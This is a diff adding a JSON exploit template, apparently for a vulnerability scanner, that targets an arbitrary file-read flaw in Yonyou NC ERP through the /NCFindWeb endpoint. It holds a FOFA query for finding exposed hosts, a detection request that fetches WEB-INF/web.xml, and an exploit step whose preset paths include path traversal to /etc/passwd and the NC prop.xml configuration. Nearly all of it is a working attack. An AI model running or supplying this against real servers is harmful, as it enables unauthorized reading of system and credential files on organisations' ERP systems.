@@ -1,0 +1,91 @@
+{
+  "Name": "Yonyou NC Arbitrary File Include",
+  "Description": "A common file inclusion vulnerability exists somewhere in Yonyou ERP-NC, allow attackers to download arbitrary files.",
+  "Product": "Yonyou-NC",
+  "Homepage": "https://www.yonyou.com/",
+  "DisclosureDate": "2015-10-21",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"Yonyou-UFIDA-NC\" || app=\"Yonyou-ERP-NC\" || title=\"YONYOU NC\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "https://fofa.so/"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "file",
+      "type": "createSelect",
+      "value": "WEB-INF/web.xml,../../../../../etc/passwd,../../ierp/bin/prop.xml"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "application/xml",
+            "variable": "$head"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "<servlet-name>NCInvokerServlet</servlet-name>",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/NCFindWeb?service=IPreAlertConfigService&filename={{{file}}}"
+      },
+      "SetVariable": [
+        "output|lastbody"
+      ]
+    }
+  ],
+  "Tags": ["fileread"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["Yonyou-NC"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
